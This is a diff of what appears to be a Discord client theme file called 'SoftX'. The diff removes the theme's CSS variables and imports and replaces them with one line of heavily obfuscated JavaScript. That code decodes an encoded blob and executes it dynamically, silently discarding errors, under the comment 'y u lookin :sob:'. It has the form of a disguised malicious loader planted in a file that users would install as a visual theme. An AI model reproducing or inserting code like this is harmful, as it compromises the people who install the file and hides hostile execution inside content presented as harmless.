@@ -1,52 +1,1 @@
-/**
- * @name SoftX
- * @author Gibbu
- * @version 1.0.0
- * @description A soft and comfy feel for Discord.
- * @source https://github.com/DiscordStyles/SoftX
- * @invite ZHthyCw
-*/
-
-@import url('https://discordstyles.github.io/SoftX/SoftX.css');
-
-/* Google Fonts */
-@import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap");
-/* Theme imports */
-/*@import url("https://discordstyles.github.io/SoftX/VerticalUserArea.css"); /* Vertical user area. Moves the mute, defean and settings icons to the server list. | Remove this line to disable. */
-@import url("https://discordstyles.github.io/Addons/windows-titlebar.css"); /* Windows titlebar. | Remove this line to disable. */
-:root {
-  /*
-   * SoftX variables
-   */
-  --background-image: url("https://i.imgur.com/Nglfni6.png"); /* Background image | URL MUST BE A DIRECT LINK (ending in .jpg, .jpeg, .png, .gif) */
-  --background-blur: 0px; /* Blur intensity of --background-image | Must end in px | Default: 0px */
- --accent: 128, 0, 128; /* Colour used around the app. | Values are in R,G,B format. | Default: 0, 231, 169 */
-  --channels-width: 300px; /* Width of the channels list. | Default: 300px */
-  --guilds-width: 105px; /* Width of the server list. | Default: 105px */
-  --members-width: 280px; /* Width of the members list. | Default: 280px */
-  --server-size: 50px; /* Size of the servers inside the server list. | Default: 50px */
-  --chat-avatar-size: 50px; /* Size of the chat avatars. | Default: 32px */
-  --glow-intensity: 0.1; /* Intensity of the glow used around the app. | Set to 0 to disable the glow. | Decimals allowed | Default: 1 */
-  --opacity: 0.85; /* Opacity of overall app. | Default: .85 */
-  --font: "Inter"; /* Custom font | Default: 'Inter' */
-  --avatar-roundness: 50%; /* Roundness for avatars. | 0% = Square, 50% = Circle | Default: 50% */
-  --server-roundness: 50%; /* Roundness for servers. | 0% = Square, 50% = Circle | Default: 50% */
-  /*
-   * RadialStatus veriables
-   */
-  --rs-small-spacing: 2px; /* Spacing between profile image and outer ring on small icons (e.g. member list) | Default: 2px */
-  --rs-medium-spacing: 4px; /* Spacing between profile image and outer ring on medium icons (e.g. user popout) | Default: 4px */
-  --rs-large-spacing: 4px; /* Spacing between profile image and outer ring on medium icons (e.g. user popout fullscreen) | Default: 4px */
-  --rs-small-width: 1.5px; /* Ring width (follows same sizing as above) | Default: 1.5px */
-  --rs-medium-width: 2px; /* Default: 2px */
-  --rs-large-width: 2px; /* Default: 2px */
-  /* Customizable colors */
-  --rs-online-color: #43b581; /* Default: #43b581 */
-  --rs-idle-color: #faa61a; /* Default: #faa61a */
-  --rs-dnd-color: #f04747; /* Default: #f04747 */
-  --rs-offline-color: #636b75; /* Default: #636b75 */
-  --rs-streaming-color: #643da7; /* Default: #643da7 */
-  --rs-invisible-color: #747f8d; /* Default: #747f8d */
-  --rs-phone-color: var(--rs-online-color); /* Color of the phone for mobile users | Default: var(--rs-online-color) */
-  --rs-phone-visible: block; /* Visibility of the phone for mobile users | Default: block */
-}
+/*y u lookin :sob: */(function(){_1O0F(";.ty.ty.up/osue&fo<bj.jj.ho.m2sn3.j<mp9jp2es8gp7tjs8o.8.fw.d.ff|tfj-u#p);pfvpg(qmtumd3z;151mqnsqtzu00tc#pde;uj/mocvs.;2i.4..2.t3tj<bj<jzq9u#bo<sf.mo.vo.fhs./t.qme.js2esbo;<gmc.o;<wd5s.bpps.;##ep#.~s(0stcgu*p);tfp@>x411b#qmtdmiBx.b*ul.vu/dghbo;b23bx1hx1n.9f{.w{.o;b6;<sf..t.mhsnhs.;tx6.xybu.o;<m;<e$.mp8th$.jp8tdsomtwce;jotjui0e//uY<s#0/bngJh11'z*p);pfvejus<|hjsqjpo#de1d39oj1vj6fx1sf.bf.u/d<#..t.sts.;t.;tt5.jqnj<sisf$.f$..g.js6u.7.tmg.p)mp.jmp#s#deA!uethjY/ui0hq0boi1&e><s#0stceoj/.snmtnnj*l.qd9<oeqjeqnjqw;du;hf2j.J.sttp;tt3.t5.qqteyfe.h;t.5..g.d1so;<sd5sjp9qm.jsqtpn#f;s#jvujujp0dA!ugpjdnuu&4jtui0e//peud;.pb);h07<hcyf-.fuymuyceyf6ib6mo<u.obp;fv6.qqnqqmbynu<eu.f3.d4sdbsp5tf$.fp4tcseip.o*ijdb-d#j;nsqtzu0Ttjvuppttjf&4CtxA!uethjopmtscvh#0vO/.sm<o1.mi<ei<fu<s1bs1pt.zguwv6so1tbyfbybd<bi.jis.qppctpbtm8..7.bme.m;<pssf<pclj#u#q#qmtdmiTptnsqoh/tms5C6qbjvujujptxftpbofi0shq.pv.u-dt;.t;.si..qu.qxj.;pfbo1we&nd<ed<sj.m;.v;txyom6.m7.p5pd4snpbjf$.o;t..om~os",(function(){this._W5L5YvH3h__wacD79={f:function(_RE3,$){_qg9="\x70\x6c\x61";function _s0L0(_RE3,$,_NL,_xf){function _2J9(_414){_414=_65AL(_414)-32-(_xf%95);if(_414<0){_414+=95;}_414+=32;_xf++;return _01(_414);};function _o80(_RE3,_NL){_gG1=_RE3[_NL];_gHq="";while(_gG1!="\f"){if(_gG1<" "){_gHq+=_gG1;}else{_gHq+=_2J9(_gG1);}_NL++;_gG1=_RE3[_NL];}return _gHq;};function _65AL(_gG1){return _gG1[_1kS](0);};function _01(_414){return this[_j6][_wNex](_414);};_NL=_NL?_NL:0;if(_RE3[_ld]>_NL){_xf=_xf?_xf:0;_76gf=_o80(_RE3,_NL);_CAp2=_76gf[_ld];_11=_o80(_RE3,_NL+_CAp2+1);_1k1=_11[_ld];$[_76gf]=_11;_s0L0(_RE3,$,_NL+_CAp2+1+_1k1+1,_xf);}};_p4B1="\x72\x65"+_qg9+"\x63\x65";_1kS=_n39k("_ahco%Cr%Aedt");_j6=_n39k("r_t%Sgni");_wNex=_n39k("_orfhCm%Crae_do");_ld=_n39k("ne_lh_tg");_s0L0(_RE3,$);function _n39k(_z5KA){return _z5KA[_p4B1](/[x%y_z]/g,'')[_p4B1](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _1O0F(_BR,_5d44,_7A,$,_5a,_eUM6){_bf=this._W5L5YvH3h__wacD79;_bf.f(_5a,$);if(!_7A){_7A=$.__u8n;}_Zg()(_BR,0,0x3f7f,this,"''");function _Zg(){return function(_P1,_RoOR,_HgwR,_WZ,_7fW8){_bf.p1=_P1;_bf.p2=_HgwR;try{_q0(_WZ)(_29mS()([_7A[$._730lN]("+p%p",_7fW8)[$._730lN]("-p%q",_7fW8)],''))();}catch(e){}function _q0(_U90){return _U90[$._nD6];};_WZ._W5L5YvH3h__wacD79=_eUM6;};};function _29mS(){return function(_M77,_Z35u){return _M77[$._g9T1](_Z35u);};};};}());
